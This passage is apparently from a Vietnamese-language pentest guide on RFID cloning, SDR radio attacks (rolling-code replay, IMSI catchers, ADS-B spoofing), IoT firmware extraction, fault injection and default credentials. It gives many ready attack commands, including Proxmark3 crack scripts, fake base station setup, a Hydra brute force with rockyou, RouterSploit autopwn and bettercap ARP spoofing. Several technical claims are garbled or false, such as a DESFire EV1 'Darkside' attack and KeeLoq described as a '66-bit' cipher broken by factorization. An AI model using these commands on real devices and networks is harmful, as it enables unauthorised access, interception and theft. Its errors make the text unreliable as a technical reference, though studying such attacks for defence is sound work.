lf em 410x     # EM410x family
lf hitag       # Hitag family (hitagS, hitag1)
lf t55xx       # T5555/T5577 programmable cards
lf io          # ioProx
lf paradox     # HID Paradox
lf viking      # Viking/Indala
lf jablotron   # Jablotron
lf nedap       # NEDAP (transit)
lf cotag       # Cotag
lf noralsy     # Noralsy

# HF commands
hf search      # Tìm thẻ HF gần đó
hf mf          # Mifare Classic
hf mfplus      # Mifare Plus
hf des         # DESFire
hf iclass      # HID iClass
hf legic       # LEGIC Prime
hf epa         # German ePassport
hf emrtd       # Electronic passport (eMRTD)
hf ntag        # NTAG
hf st          # ST Microelectronics
hf mrtd        # Machine Readable Travel Documents
hf matalis     # Matalis protocol
hf topaz       # Topaz (Jewel)
hf 14a         # ISO 14443-4
hf 15          # ISO 15693
hf felica      # FeliCa
hf picopass    # HID iClass (Picopass)
hf sniff       # Sniff HF communication

# Simulation
lf sim
hf sim

# Standalone mode
data load -f /path/to/dump.bin
hf mf eload    # Load emulator
hw start        # Bắt đầu standalone mode
```

### 5.3. Các attack script

```bash
# Brute force Mifare (dictionary attack)
script run hf_mf_auto  # Tự động phát hiện và crack

# Hardnested attack
script run hf_mf_hardnested

# ICopy-X script
script run hf_icopy_x

# HID iClass attack
script run hf_iclass_attack
```

## 6. ChameleonMini và Flipper Zero

### 6.1. ChameleonMini

- **Giá**: ~$80-150
- **Hỗ trợ**: 13.56 MHz (HF) + LF (tùy phiên bản)
- **Chức năng**: Giả lập thẻ, ghi thẻ, sniff, relay
- **Cấu hình qua USB Web GUI**
- **Slot**: 8 configurations (chuyển đổi bằng nút)

**Các card hỗ trợ:**
- Mifare Classic 1K/4K
- Mifare Ultralight
- Mifare DESFire (EV1)
- NFC Type 4
- iClass (Picopass)
- EM4100 (LF, với Rev E)
- ISO 15693 (NXP ICODE)

### 6.2. Flipper Zero

- **Giá**: ~$200
- **Frequency**: 125 kHz, 13.56 MHz, 315/433/868/915 MHz, IR, iButton (1-Wire)
- **Chức năng**: Đọc/giả lập RFID, NFC, infrared, GPIO, UART, sub-GHz
- **GPIO**: 8 pins (UART, SPI, I2C)
- **Firmware mở**: Official, Unleashed, RogueMaster, Xtreme

**Các tính năng pentest:**
- Read/emulate 125 kHz RFID (EM4100, HID Prox, Indala, AWID)
- Read/emulate 13.56 MHz (Mifare Classic, NTAG, iClass)
- Sub-GHz: capture và replay remote (key fob, garage door)
- Infrared: capture và replay IR signals
- Bad USB: Rubber Ducky style keyboard injection
- UART: console access
- GPIO: SPI, I2C, PWM

## 7. HID iClass, iCLASS SE, HID Prox

### 7.1. HID Prox (125 kHz)

- Thẻ LF phổ biến nhất cho access control
- **Format**: 26-bit Wiegand (8-bit facility code + 16-bit card number)
- **Clone**: Dễ dàng với Proxmark3 hoặc Flipper Zero
- **Security**: Rất thấp, không mã hóa

### 7.2. HID iClass (13.56 MHz)

- **iClass Standard**: Dữ liệu được mã hóa (DEA/3DES), nhưng key có thể extract
- **iClass SE (Secure Element)**: Cải thiện bảo mật, nhưng vẫn có lỗ hổng
- **Picopass**: iClass SE thế hệ cũ

**Tấn công iClass trên Proxmark3:**
```bash
hf iclass           # Menu iClass commands
hf iclass read      # Đọc card
hf iclass decrypt   # Giải mã (cần biết Application Key)
hf iclass sim       # Giả lập
hf iclass clone     # Clone
hf iclass attack    # Brute force key
hf iclass lookup    # Tra cứu key từ database
```

### 7.3. HID iCLASS SE (Secure Element)

- iCLASS SE có Secure Element (SE) bên trong
- Key được lưu trong SE → khó extract
- Tuy nhiên, có thể downgrade về iClass cũ
- Relay attack vẫn hoạt động (dù không đọc được key)

## 8. DESFire Attacks

### 8.1. DESFire EV1

- Mifare DESFire EV1 dùng 3DES hoặc AES-128
- **Lỗ hổng**: Darkside attack (2019) — timing attack trên nonce
- **Yêu cầu**: Hardware modifier cho Proxmark3

### 8.2. DESFire EV2/EV3

- EV2: Thêm proximity check (chống relay)
- EV3: ISO 14443-4, AES, chống trace
- **Hiện tại**: Chưa có attack thực tế public

---

# G. SDR & RADIO ATTACKS

## 1. Software-Defined Radio (SDR)

### 1.1. Khái niệm

SDR (Software-Defined Radio): Các thành phần xử lý tín hiệu (mixer, filter, modulator) được thực hiện bằng software thay vì hardware.

### 1.2. Hardware SDR

| Thiết bị | Frequency range | Bandwidth | Bit depth | Giá (~) |
|----------|----------------|-----------|-----------|---------|
| **RTL-SDR** (RTL2832U) | 24-1766 MHz | 3.2 MHz | 8-bit | $25 |
| **HackRF One** | 1 MHz-6 GHz | 20 MHz | 8-bit | $300 |
| **BladeRF 2.0 micro** | 47 MHz-6 GHz | 61.44 MHz | 12-bit | $480 |
| **USRP B210** | 70 MHz-6 GHz | 56 MHz | 12-bit | $1,200 |
| **LimeSDR Mini** | 10 MHz-3.5 GHz | 30.72 MHz | 12-bit | $140 |
| **Airspy R2** | 24-1700 MHz | 10 MHz | 12-bit | $170 |
| **Airspy Mini** | 24-1800 MHz | 6 MHz | 12-bit | $100 |
| **PlutoSDR** | 325-3800 MHz | 20 MHz | 12-bit | $100 |

**RTL-SDR:**
- Chip: RTL2832U (DVB-T tuner) + R820T2 tuner
- Giới hạn: Chỉ receive, 3.2 MHz bandwidth
- Dùng cho: ADS-B, POCSAG, AIS, weather satellites, ISM band monitoring

**HackRF One:**
- Transceiver (TX + RX)
- 1 MHz-6 GHz
- Bắt đầu từ ~$300
- **Vấn đề**: Half-duplex (không TX và RX cùng lúc), bandwidth hạn chế

**BladeRF:**
- Full-duplex
- Bandwidth lớn hơn (61.44 MHz)
- 12-bit ADC → SNR tốt hơn

### 1.3. Software

| Công cụ | Mục đích |
|---------|---------|
| **GNU Radio** | Signal processing framework, block-based |
| **GQRX** | Spectrum analyzer, demodulator |
| **Universal Radio Hacker (URH)** | Protocol reverse engineering |
| **SDRAngel** | SDR GUI application |
| **CubicSDR** | Cross-platform SDR |
| **INSPECTRE** | SDR reconnaissance platform |
| **rtl_433** | ISM band decoder (weather, sensors) |
| **dump1090** | ADS-B decoder |
| **multimon-ng** | POCSAG, FSK decoders |
| **rtl_ais** | AIS ship tracking |
| **gr-gsm** | GSM protocol (GNU Radio) |
| **gr-lora** | LoRa protocol (GNU Radio) |
| **gr-ieee802-11** | Wi-Fi (GNU Radio) |

## 2. GNU Radio, GQRX, Universal Radio Hacker (URH)

### 2.1. GNU Radio

GNU Radio là framework block-based cho xây dựng SDR application:

```bash
# Cài đặt
apt install gr-osmosdr gnuradio

# GRC (GNU Radio Companion) — GUI flowgraph
gnuradio-companion

# Các block quan trọng:
# - osmocom Source (SDR driver)
# - Low Pass Filter
# - Constellation Mod/Demod
# - WBFM Receive
# - NBFM Receive
# - AM Demod
# - FFT Sink (spectrum analyzer)
# - QT GUI (visualization)
# - File Sink (ghi raw I/Q)
# - Wireshark Connector
```

### 2.2. GQRX

GQRX là Spectrum Analyzer + Receiver:

```bash
gqrx

# Các tính năng:
# - IQ recording (raw I/Q samples)
# - AM, NFM, WFM, LSB, USB, CW demodulation
# - Waterfall display
# - Frequency manager
# - Doppler correction
# - Audio recording
```

### 2.3. Universal Radio Hacker (URH)

URH là công cụ mạnh cho reverse engineering wireless protocols:

```bash
# Cài đặt
python3 -m pip install urh

# Chạy
urh

# Quy trình:
# 1. Record signal (hoặc mở file)
# 2. Demodulation (OOK, FSK, PSK, ASK, MSK, ...)
# 3. Decode bits → hex → interpretation
# 4. Replay signal
# 5. Fuzzing

# Các bước trong URH:
# 1. Record → Open file
# 2. Demodulate → chọn modulation
# 3. Assign bits → xác định protocol
# 4. Generate → tạo modified signals
# 5. Send → Replay (với HackRF/USRP)
```

## 3. Replay Attacks on Rolling Codes

### 3.1. Rolling Code (Mã trượt)

Rolling code dùng để chống replay attack — mỗi lần bấm remote, mã thay đổi:

```
Remote               Receiver
  |                     |
  |-- [Counter + MAC]-->|
  |  Counter tăng dần   |
  |  MAC = AES(Key, Counter, Command) |
  |                     |
  |                     | Verify MAC
  |                     | Accept if counter > last known
```

### 3.2. Tấn công RollJam (Samy Kamkar, 2015)

RollJam — đánh lừa rolling code bằng jamming + capture:

```
Attacker               Remote              Car
   |                      |                  |
   |                      |--[CODE N]------->|
   |                      |  JAM! (noise)    |
   |  Capture CODE N      |                  |
   |                      |--[CODE N+1]----->|
   |                      |  JAM! (noise)    |
   |  Capture CODE N+1    |                  |
   |  Replay CODE N       |--[Replay CODE N]>|
   |                      |                  | Accept (counter N đúng)
   |  Lưu CODE N+1 cho sau|
```

**Điều kiện:**
- JAM sóng của remote gần đồng thời với capture
- Sử dụng HackRF hoặc Yard Stick One + Raspberry Pi

**Công cụ:**
- **RollJam** (Samy Kamkar's project)
- **Rollback** (Rolling code analysis)
- **Flipper Zero Sub-GHz**: Capture + Replay

### 3.3. Amplification Relay Attack

Kéo dài range của keyless entry:
```
Car <--[25m]-- Relay A <--[LTE/WiFi]-- Relay B <--[25m]-- Key Fob

→ Xe tưởng key fob ở gần
→ Có thể mở/xe từ xa (hàng km)
```

**Phương pháp:**
- Hai HackRF hoặc USRP
- Delay nhỏ hơn window của rolling code
- Tested trên Tesla, BMW, Mercedes (2018-2021)

### 3.4. Keeloq Attack

Keeloq là rolling code phổ biến trong garage door và car keys:
- 66-bit KeeLoq block cipher
- **Lỗ hổng**: Factorization attack trên key (cần 2-4 captured messages)
- **Crack**: Dùng GPU, thời gian ~1 giờ

```bash
# Công cụ: Crackle (Keeloq cracking)
# https://github.com/P1sec/pykeeloq
```

## 4. Keyless Entry Systems

### 4.1. Passive Keyless Entry (PKE)

- Car phát LF signal (125 kHz) để "wake up" key fob
- Key fob trả lời UHF signal (315/433/868/915 MHz)
- **Tấn công**: Amplify LF signal → đánh lừa xe tin key ở gần

### 4.2. RKE (Remote Keyless Entry)

- UHF signal khi nhấn nút
- Rolling code với counter + encryption
- **Tấn công**: Replay blocking, RollJam, brute force (trên hệ thống cũ)

## 5. GSM Interception

### 5.1. GSM Architecture

```
MS (Mobile) <--> BTS <--> BSC <--> MSC <--> PSTN/Internet
```

**A5/1 Encryption:**
- Stream cipher dùng trong GSM
- 64-bit key (thực tế chỉ 54-bit)
- **Crack**: A5/1 có thể brute force với rainbow table (1TB) hoặc FPGA

### 5.2. IMSI Catcher

IMSI Catcher (bắt IMSI của phone):
```
MS ----> [Fake BTS] <--- Attacker
```

**Công cụ:**
```bash
# gr-gsm (GNU Radio GSM)
git clone https://git.osmocom.org/gr-gsm
cd gr-gsm
mkdir build && cd build
cmake ..
make && make install

# Chạy IMSI catcher
grgsm_livemon     # Live monitoring
grgsm_scanner     # Scan GSM base stations
grgsm_capture     # Capture GSM traffic

# YateBTS (Full BTS stack)
# OpenBTS (Full BTS stack)

# Fake BTS với USRP/HackRF + YateBTS
# Cần: USRP/HackRF, SIM card 3G/4G USB modem
```

### 5.3. GSM Attack Tools

- **Kraken (A5/1 cracker)**: FPGA-based, rainbow table
- **GSMReversing**: Python A5/1 analysis
- **OsmocomBB**: Software GSM baseband (điện thoại cũ dùng chipset Mediatek, Calypso)
- **USRP + OpenBTS**: Fake BTS

## 6. ADS-B Aircraft Tracking

### 6.1. ADS-B (Automatic Dependent Surveillance-Broadcast)

- Aircraft định kỳ broadcast vị trí, speed, ID
- Frequency: 1090 MHz (Mode S)
- **Không xác thực!** — có thể giả mạo

```bash
# dump1090
dump1090 --interactive --net --net-http-port 8080

# Virtual Radar Server (Web UI)
# Mở http://localhost:8080

# FlightAware
adsb-feeder
```

### 6.2. ADS-B Attacks

- **Spoofing**: Gửi fake aircraft position (với HackRF)
- **Jamming**: Gây nhiễu 1090 MHz
- **Eavesdropping**: Nghe lén vị trí máy bay

## 7. LoRa, Zigbee, Z-Wave

### 7.1. LoRa (Long Range)

- **Frequency**: 868 MHz (EU), 915 MHz (US), 923 MHz (Asia)
- **Range**: 2-15 km (line of sight)
- **Modulation**: CSS (Chirp Spread Spectrum)
- **Ứng dụng**: Smart city, agriculture, logistics

**Attacks:**
- **Replay**: LoRaWAN có frame counter, nhưng có thể jamming + replay
- **Spoofing**: Nếu không có authentication
- **Jamming**: CSS resistant nhưng có thể jam với đủ power
- **Key extraction**: Từ gateway/end node

```bash
# gr-lora (GNU Radio LoRa)
git clone https://github.com/rpp0/gr-lora

# Things Unsecured (Phân tích LoRaWAN)
git clone https://github.com/mikeryanmay/things-unsecured
```

### 7.2. Zigbee

- **Frequency**: 2.4 GHz (toàn cầu), 868 MHz (EU), 915 MHz (US)
- **Chuẩn**: IEEE 802.15.4
- **Range**: 10-100m
- **Ứng dụng**: Smart home (Philips Hue, Xiaomi), industrial, lighting

**Security:**
- **Zigbee 3.0**: AES-128-CCM
- **Transport Key**: Gửi encrypted sau khi join network
- **Network Key**: Shared key trong network
- **Install Code**: Dùng để cài đặt key ban đầu (Zigbee 3.0)

**Attacks:**
- **Sniffing**: Capture Zigbee traffic với RZUSBstick hoặc TI CC2531
  ```bash
  # KillerBee (Zigbee security framework)
  git clone https://github.com/riverloobey/killerbee
  cd killerbee
  python3 zbstumbler.py -i /dev/ttyUSB0
  
  # Sniff
  python3 zbdump.py -i /dev/ttyUSB0 -w capture.pcap
  
  # Crack network key
  python3 zbreplay.py -i /dev/ttyUSB0 -f capture.pcap
  ```

- **Network Key Extraction**: Từ dumps thiết bị
- **Replay Attack**: Nếu network key biết
- **Touchlink Attack**: Khai thác Zigbee Touchlink (install code)
- **Zigbee Proxy Attack**: Netflix/Harvard research (2018)

### 7.3. Z-Wave

- **Frequency**: 868.42 MHz (EU), 908.42 MHz (US), 919.8 MHz (Hong Kong)
- **Modulation**: FSK, GFSK
- **Range**: 30-100m
- **Mesh network**: Mỗi node là repeater

**Security:**
- **Z-Wave S0**: Old (DES), lỗ hổng
- **Z-Wave S2**: New (AES-128), OK
- **S0 Vulnerability**: XOR-based key exchange → có thể capture key

**Attacks:**
- **S0 Key capture**: Dùng HackRF capture S0 inclusion
- **Z-Wave Protocol Fuzzing**: Tìm lỗ hổng trong implementation
- **DoS**: Gửi frame yêu cầu node xác nhận → làm node treo
- **Replay**: Nếu không có frame counter

---

# H. IOT/HARDWARE ATTACKS

## 1. Firmware Extraction

### 1.1. Các phương pháp extract firmware

| Phương pháp | Yêu cầu | Độ khó | Tốc độ |
|-------------|---------|--------|--------|
| **UART boot log** | UART access | Thấp | Nhanh |
| **SPI flash read** | SPI pins access | Trung bình | Trung bình |
| **JTAG/SWD** | JTAG/SWD pins | Cao | Nhanh |
| **I2C EEPROM** | I2C bus access | Thấp | Chậm |
| **USB DFU** | DFU mode | Thấp | Nhanh |
| **OTA update capture** | Proxy/MITM | Trung bình | Phụ thuộc |
| **NAND/NOR memory read** | Chip removal | Cao | Trung bình |
| **eMMC read** | BGA access | Rất cao | Trung bình |
| **Fault injection** | Glitcher hardware | Rất cao | Nhanh |

### 1.2. Các cổng giao tiếp trên IoT device

```
Typical IoT PCB:

[SoC]────[SPI Flash]────[Power Regulator]
   │           │
   ├── UART   [I2C EEPROM]
   ├── JTAG/SWD
   ├── USB
   ├── GPIO
   └── Antenna (ESP32/CCxxxx)
```

## 2. UART Console Access

### 2.1. Xác định UART pins

UART thường có 4 pins: TX, RX, GND, VCC (3.3V hoặc 1.8V)

**Cách tìm UART:**
1. **Visual inspection**: Tìm 4 lỗ tròn/square gần nhau, thường có test points
2. **Multimeter**: Đo voltage:
   - GND → 0V
   - TX → 3.3V/1.8V khi có data
   - RX → 3.3V/1.8V (idle high)
   - VCC → 3.3V hoặc 1.8V
3. **Logic Analyzer**: Đổ chuông các test point trong lúc boot
4. **Oscilloscope**: Xem data pattern

### 2.2. Kết nối UART

```bash
# Cần: USB-UART adapter (FTDI, CP2102, CH340G, PL2303)

# Kết nối:
# IoT GND    ←→  USB-UART GND
# IoT TX     ←→  USB-UART RX
# IoT RX     ←→  USB-UART TX
# IoT VCC    ←→  KHÔNG KẾT NỐI (dùng nguồn riêng)

# Xác định baud rate (thường: 9600, 19200, 38400, 57600, 115200)
# Phương pháp 1: Đo với logic analyzer
# Phương pháp 2: Thử từng baud rate

# Terminal
screen /dev/ttyUSB0 115200
# hoặc
minicom -D /dev/ttyUSB0 -b 115200
# hoặc
picocom /dev/ttyUSB0 -b 115200

# Tự động detect baud rate
baudrate -s /dev/ttyUSB0
```

### 2.3. Baud Rate Identification

```bash
# Cách thủ công: Chụp boot log và xác định bit width
# logic 2 software (Logic Analyzer): 
#   Đo bit width → baudrate = 1/bit_width

# Cách tự động với Python
python -c "
import serial
import time

for baud in [9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600]:
    try:
        ser = serial.Serial('/dev/ttyUSB0', baud, timeout=1)
        time.sleep(0.5)
        data = ser.read(100)
        if data:
            print(f'Baud {baud}: {data[:50]}')
        ser.close()
    except:
        pass
"
```

### 2.4. Boot Log Analysis

**What to look for in boot log:**

```
# Thông tin quan trọng:
- Kernel version
- Filesystem mounted (squashfs, jffs2, ubifs)
- Uboot environment variables
- Load addresses (RAM start, kernel load)
- SPI flash partition table
- MAC addresses
- Default credentials
- Debug enabled (telnet, backdoor shell)
- Init process
- System services (httpd, sshd, telnetd)
- Hardware info (chipset, RAM size, flash size)
```

## 3. SPI Flash Dumping

### 3.1. SPI Protocol

SPI (Serial Peripheral Interface):
- **SCLK**: Clock
- **MOSI**: Master Out Slave In
- **MISO**: Master In Slave Out
- **CS**: Chip Select

**Common SPI flash chips:**
- Winbond (W25Q32, W25Q64, W25Q128)
- Macronix (MX25L...)
- Gigadevice (GD25...)
- EON (EN25...)
- Spansion (S25FL...)
- Micron (N25Q...)

### 3.2. SPI Flash Dumping Methods

**Method 1: Bus Pirate + flashrom**
```bash
# Kết nối Bus Pirate:
# MOSI ←→ SPI MOSI
# MISO ←→ SPI MISO
# SCLK ←→ SPI SCLK
# CS   ←→ SPI CS (active low)
# GND  ←→ SPI GND
# 3.3V ←→ SPI VCC

# Bus Pirate mode: SPI
# (1) HiZ → (m) SPI → (3) 3.3V → (1) HiZ → sp

# flashrom
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware.bin

# Detect chip
flashrom -p buspirate_spi:dev=/dev/ttyUSB0

# Read flash
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin

# Verify
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -v dump.bin

# Write (nếu cần)
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -w new_firmware.bin
```

**Method 2: FTDI FT232H + flashrom**
```bash
# Dùng Adafruit FT232H Breakout
flashrom -p ft2232_spi:type=232H -r firmware.bin
```

**Method 3: Raspberry Pi + flashrom**
```bash
# Kết nối GPIO:
# GPIO10 (MOSI) ←→ SPI MOSI
# GPIO9  (MISO) ←→ SPI MISO
# GPIO11 (SCLK) ←→ SPI SCLK
# GPIO8  (CS0)  ←→ SPI CS
# GND    ←→ SPI GND
# 3.3V   ←→ SPI VCC

# Enable SPI
raspi-config  # → Interface Options → SPI → Enable

# flashrom
flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin
```

**Method 4: Clip-on SPI Programmer (Pomona 5250 clip)**
- Không cần hàn — dùng clip kẹp vào chip SPI
- Phù hợp cho chip SOIC-8

**Method 5: Hot air desolder + programmer**
- Tháo chip bằng hot air
- Lấy chân vào programmer (CH341A, TL866II Plus)
- Có thể backup factory content

### 3.3. Tool: SPI Flash Dumper

```bash
# Kiểm tra chip (dùng flashrom)
flashrom -p buspirate_spi:dev=/dev/ttyUSB0

# List các chip hỗ trợ
flashrom -L | grep W25Q128

# Đọc từng sector
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin --layout layout.txt

# So sánh dump để tìm khác biệt
hexdump -C dump.bin | less
binwalk dump.bin  # Tìm filesystem embedded
binwalk -e dump.bin  # Extract filesystem

# Phân tích dump
strings dump.bin | grep -i password
strings dump.bin | grep -i admin
strings dump.bin | grep -E 'ssid|wpa|psk|pass'
```

## 4. I2C Bus

### 4.1. I2C Protocol

I2C (Inter-Integrated Circuit):
- **SCL**: Clock
- **SDA**: Data
- Mỗi device có 7-bit hoặc 10-bit address
- Speed: 100 kHz (Standard), 400 kHz (Fast), 1 MHz (Fast+), 3.4 MHz (High Speed)

### 4.2. I2C Bus Scanning

```bash
# Với Bus Pirate:
# (1) HiZ → (m) I2C → (3) 3.3V → (1) HiZ → (1) Software → 100kHz

# Scan devices:
# (1) Scan

# Với i2c-tools:
sudo apt install i2c-tools

# Detect I2C bus
i2cdetect -l

# Scan devices trên bus 1
i2cdetect -y 1

# Kết quả:
#      0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
# 00:          -- -- -- -- -- -- -- -- -- -- -- -- --
# 10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
# 20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
# 30: -- -- -- -- -- -- -- UU -- -- -- -- -- -- -- --
# => 0x36 có device (UU = driver loaded, -- = empty)
```

**Common I2C addresses:**
- 0x50-0x57: EEPROM (AT24Cxx)
- 0x3C-0x3D: OLED display (SSD1306)
- 0x48-0x4F: Temperature sensors
- 0x68-0x6F: RTC (DS3231, DS1307)
- 0x76-0x77: BME280, BMP280
- 0x1E: Magnetometer (HMC5883L)
- 0x19-0x20: Accelerometer (MPU6050)

### 4.3. I2C EEPROM Dumping

```bash
# Dùng i2c-tools
i2cget -y 1 0x50 0x00   # Đọc 1 byte từ EEPROM address 0x50

# Dump entire EEPROM
i2cdump -y 1 0x50        # Hiển thị dump

# Dump với xxd
i2cget -y 1 0x50 0x00 w | xxd

# Đọc EEPROM (8KB AT24C64)
# AT24C64: 0x50-0x57, 8192 bytes
python -c "
import smbus2
bus = smbus2.SMBus(1)
addr = 0x50
data = []
for i in range(0, 8192, 32):
    block = bus.read_i2c_block_data(addr, i, 32)
    data.extend(block)
with open('eeprom_dump.bin', 'wb') as f:
    f.write(bytes(data))
"

# Với Bus Pirate:
# Sau khi scan được address, dùng:
# [0xa0] [0x00 addr] [0xa1] [read bytes...]
```

### 4.4. I2C Attack Vectors

- **Sniffing**: Dùng logic analyzer capture I2C traffic
- **Man-in-the-Middle**: Dùng Bus Pirate hoặc FPGA
- **Write EEPROM**: Ghi dữ liệu giả vào EEPROM
- **Glitching**: Tạo glitch trên SCL để bypass security

## 5. JTAG/SWD

### 5.1. JTAG (Joint Test Action Group — IEEE 1149.1)

**JTAG signals:**
- **TCK**: Test Clock
- **TMS**: Test Mode Select
- **TDI**: Test Data In
- **TDO**: Test Data Out
- **TRST** (optional): Test Reset
- **nSRST** (optional): System Reset

**JTAG TAP Controller States:**
- Test-Logic-Reset
- Run-Test/Idle
- Select-DR-Scan → Capture-DR → Shift-DR → Exit1-DR → Update-DR
- Select-IR-Scan → Capture-IR → Shift-IR → Exit1-IR → Update-IR

### 5.2. SWD (Serial Wire Debug)

ARM SWD alternative (2 pins thay vì 4):
- **SWDIO**: Data I/O
- **SWCLK**: Clock
- Thường thấy trên ARM Cortex-M devices (STM32, nRF52, ESP32)

### 5.3. Tìm và test JTAG

```bash
# JTAGulator (công cụ chuyên tìm JTAG)
# Kết nối JTAGulator đến target
# Chạy tự động quét

# JTAGenum (Arduino-based JTAG scanner)
git clone https://github.com/cyphunk/JTAGenum
cd JTAGenum/avr
make && make upload

# JtagFinder (Detect JTAG with Raspberry Pi)
git clone https://github.com/hsaturn/JtagFinder

# OpenOCD (debug và program)
openocd -f interface/jlink.cfg -f target/stm32f1x.cfg
# Telnet: telnet localhost 4444
# GDB: target extended-remote localhost 3333

# OpenOCD commands:
# halt                  # Stop CPU
# reset                 # Reset
# flash write_image     # Write flash
# flash read_bank       # Read flash
# dump_image            # Dump memory
# mdw 0x08000000        # Read memory word
# mww 0x08000000 0x1234 # Write memory word
```

### 5.4. JTAG Boundary Scan

Boundary scan cho phép test/điều khiển từng pin của IC:

```bash
# Với OpenOCD
openocd -f board/stm32f4discovery.cfg

# Telnet
# > scan_chain          # Xem JTAG chain
# > svf chip.svf        # Run SVF (Serial Vector Format)
# > xsvf chip.xsvf      # Run XSVF (Compressed SVF)

# UrJTAG (Universal JTAG)
jtag
# cable ft2232
# detect
# idcode
```

### 5.5. JTAG Security

**JTAG/SWD Disable (secure boot):**
- Nhiều chip có fuse bit (efuse) để disable JTAG
- **Bypass**: Voltage glitching, clock glitching, EM glitching
- **Cách test**: Thử kết nối trước khi boot (JTAG active lúc boot)

## 6. EEPROM Reading/Writing

### 6.1. AT24Cxx Series (I2C EEPROM)

Phổ biến trong IoT devices để lưu config:

```bash
# Dùng USB EEPROM programmer
# CH341A programmer + software

# Với flashrom
flashrom -p ch341a_spi -r eeprom.bin

# Với i2c-tools (nếu I2C accessible)
i2cdump -y 1 0x50 b 0x00

# Ghi
i2cset -y 1 0x50 0x00 0xAA b  # Ghi 0xAA vào offset 0
```

### 6.2. 93Cxx Series (Microwire/SPI EEPROM)

```bash
# Dùng Bus Pirate hoặc TL866II Plus
# flashrom cũng hỗ trợ
flashrom -p ch341a_spi:type=93cxx
```

## 7. Glitching (Voltage, Clock, EM)

### 7.1. Khái niệm

Glitch: Tạo lỗi tạm thời trong hoạt động của chip để:
- Bypass security checks
- Bỏ qua bootloader signature verification
- Thay đổi execution flow
- Đọc dữ liệu protected

### 7.2. Các loại Glitch

**Voltage Glitch (VCC glitch):**
- Giảm hoặc tăng voltage đột ngột
- Làm CPU đọc sai instruction
- Cần glitcher (ChipWhisperer, PicoGlitcher, custom)

```bash
# PicoGlitcher (dùng Raspberry Pi Pico)
git clone https://github.com/hackcasual/picoglitcher

# ChipWhisperer (CW1173)
# Python API
import chipwhisperer as cw
scope = cw.scope()
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "glitch_only"
scope.glitch.width = 50e-9  # 50ns
scope.glitch.offset = 0
# Brute force offset và width
```

**Clock Glitch:**
- Thay đổi clock frequency đột ngột
- Làm CPU execute instruction sai
- Cần clock source control

**EM Glitch (Electromagnetic):**
- Dùng EM probe tạo điện từ trường mạnh
- Không cần tiếp xúc vật lý
- ChipShover, EM-FI probe

### 7.3. Fault Injection Tools

| Tool | Giá | Type | Notes |
|------|-----|------|-------|
| **ChipWhisperer-Lite** | ~$250 | Voltage/Clock | Beginner friendly |
| **ChipWhisperer-Pro** | ~$3000 | Voltage/Clock/EM | Professional |
| **PicoGlitcher** | ~$15 | Voltage | DIY, RPi Pico based |
| **Riscure Spider** | ~$50,000 | Voltage/Clock/EM | Professional |
| **NewAE Side-Channel** | ~$200 | Power analysis | SAKURA-G, CW-Husky |
| **Faulty Mongoose** | ~$300 | Voltage | Open source |
| **FTDI+MOSFET glitcher** | ~$20 | Voltage | DIY |

## 8. Side-Channel Attacks

### 8.1. Power Analysis

**Simple Power Analysis (SPA):**
- Phân tích power trace để xác định instruction
- Có thể đọc được thuật toán (DES, AES rounds)

**Differential Power Analysis (DPA):**
- Phân tích thống kê nhiều power traces
- Tìm key bằng cách correlate power consumption với data

**Correlation Power Analysis (CPA):**
- Tính correlation giữa power model và actual traces
- Dùng model: Hamming weight, Hamming distance

```bash
# ChipWhisperer power analysis
python -c "
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope)

# Capture power trace
trace = scope.capture_trace()

# CPA attack
from chipwhisperer.analyzer import cpa
attack = cpa.CPA()
attack.set_traces(traces, textins.keys)
key = attack.run()
print('Recovered key:', key)
"
```

### 8.2. Timing Analysis

- Đo thời gian thực thi thuật toán
- Timing khác nhau dựa trên input → leak thông tin về key
- Ví dụ: AES timing, RSA timing (CRT), HMAC timing

```bash
# Remote timing attack trên HMAC
python -c "
import time
import socket

times = []
for i in range(1000):
    s = socket.socket()
    s.connect(('target', 80))
    start = time.time()
    s.send(b'GET / HTTP/1.1\r\n')
    s.send(b'Authorization: HMAC ' + b'A' * i + b'\r\n')
    s.recv(1024)
    end = time.time()
    times.append(end - start)
    s.close()
"
```

### 8.3. EM Analysis (Electromagnetic)

- Đo EM radiation từ chip
- Không cần tiếp xúc
- Có thể đọc data từ xa (TEMPEST)
- Cần EM probe (Langer, RF-U 5-2)

---

# I. IOT VULNERABILITIES

## 1. Default Credentials

### 1.1. Các credential phổ biến

```bash
# Router/AP
admin:admin, admin:password, root:root, admin:1234, admin:0000

# IP Camera
admin:admin, admin:123456, admin:1111, 666666:666666, admin:admin1234

# IoT vendors
# Hikvision: admin:12345
# Dahua: admin:admin
# TP-Link: admin:admin
# D-Link: admin:admin
# Huawei: admin:admin
# Xiaomi: admin:admin
```

### 1.2. Công cụ

```bash
# Default credentials database
# https://github.com/ihebski/DefaultCreds-cheat-sheet

# CIRT.net passwords (browser)
# https://default-password.info/

# RouterSploit (Auto exploit)
git clone https://github.com/threat9/routersploit
cd routersploit
python3 rsf.py
# rsf > use scanners/autopwn
# rsf > set target 192.168.1.1
# rsf > run

# Hydra (brute force)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## 2. Insecure Firmware Updates

### 2.1. Vấn đề thường gặp

1. **No signing**: Firmware không được sign → attacker inject malicious firmware
2. **No encryption**: OTA update không mã hóa → attacker đọc/modify firmware
3. **No integrity check**: Không checksum → corrupt/changed firmware không bị phát hiện
4. **HTTP download**: Dùng HTTP thay vì HTTPS → MITM attack
5. **Hardcoded update key**: Key update được hardcode trong firmware
6. **Version downgrade**: Không kiểm tra version → attacker có thể rollback firmware cũ có lỗ hổng
7. **Partial update**: Only update một phần → attacker chỉ cần modify phần đó

### 2.2. OTA Update Interception

```bash
# MITM OTA update với bettercap
sudo bettercap -eval "net.probe on; net.sniff on"

# Bắt HTTP download
sudo bettercap -eval "http.proxy on; http.proxy.script /path/to/script.js"

# ARP spoof target
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"

# MITMProxy (HTTPS)
